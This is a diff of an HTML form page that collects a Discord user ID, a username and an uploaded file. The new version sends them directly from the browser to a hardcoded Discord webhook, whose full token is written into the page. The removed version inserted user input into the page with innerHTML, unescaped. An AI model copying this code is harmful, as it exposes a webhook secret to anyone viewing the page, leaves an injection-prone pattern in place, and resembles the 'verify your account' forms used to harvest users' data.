@@ -1,90 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Form</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #1e90ff, #6a5acd);
-            color: #ffffff;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
-        .form-container, .log-container {
-            width: 350px;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            color: #fff;
-        }
-        .log-container {
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        label, input, button {
-            display: block;
-            width: 100%;
-            margin-bottom: 10px;
-        }
-        input, button {
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-        }
-        button {
-            background: #4caf50;
-            color: white;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Submission Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: white;
+      text-align: center;
+      padding: 2em;
+    }
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 0.5em;
+    }
+    form {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 2em;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+    input[type="text"], input[type="file"] {
+      width: 80%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: none;
+      font-size: 1em;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1em;
+      border: none;
+      border-radius: 5px;
+      background: #4caf50;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #45a049;
+    }
+  </style>
 </head>
 <body>
-    <div class="form-container">
-        <h1>Verify Your Account</h1>
-        <form id="verifyForm">
-            <label for="discordId">Discord User ID</label>
-            <input type="text" id="discordId" name="discordId" required>
-            <label for="username">Username</label>
-            <input type="text" id="username" name="username" required>
-            <label for="file">Upload File</label>
-            <input type="file" id="file" name="file" required>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
-    <div class="log-container" id="logContainer">
-        <h2>Submissions Log</h2>
-    </div>
+  <h1>Submit Your Data</h1>
+  <form id="submissionForm">
+    <input type="text" id="discordId" placeholder="Discord User ID" required><br>
+    <input type="text" id="username" placeholder="Username" required><br>
+    <input type="file" id="fileInput" required><br>
+    <button type="submit">Submit</button>
+  </form>
 
-    <script>
-        document.getElementById('verifyForm').addEventListener('submit', function (e) {
-            e.preventDefault();
-            const discordId = document.getElementById('discordId').value;
-            const username = document.getElementById('username').value;
-            const fileInput = document.getElementById('file').files[0];
-            const formData = new FormData();
-            formData.append('discordId', discordId);
-            formData.append('username', username);
-            formData.append('file', fileInput);
+  <script>
+    const form = document.getElementById('submissionForm');
 
-            fetch('/api/data', { method: 'POST', body: formData })
-                .then(response => response.json())
-                .then(data => addLog(discordId, username, data.fileUrl))
-                .catch(error => alert('Error submitting data.'));
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const discordId = document.getElementById('discordId').value;
+      const username = document.getElementById('username').value;
+      const fileInput = document.getElementById('fileInput').files[0];
+
+      const webhookUrl = 'https://discord.com/api/webhooks/1331601134481182782/G_OWUODNWe-D-piXEb_q6BlDQidRQ-gDuijYURYWGhF4Tjw9AZ7hca_4ZizK5prAHcal';
+      const formData = new FormData();
+      formData.append('content', `@everyone\n**New Submission**\n**Discord ID**: ${discordId}\n**Username**: ${username}`);
+      formData.append('file', fileInput);
+
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          body: formData,
         });
 
-        function addLog(discordId, username, fileUrl) {
-            const logBox = document.createElement('div');
-            logBox.innerHTML = `<p><b>ID:</b> ${discordId} <b>Username:</b> ${username} <a href="${fileUrl}">Download</a></p>`;
-            document.getElementById('logContainer').appendChild(logBox);
+        if (response.ok) {
+          alert('Data submitted successfully!');
+        } else {
+          alert('Failed to submit data.');
         }
-    </script>
+      } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred while submitting data.');
+      }
+    });
+  </script>
 </body>
 </html>
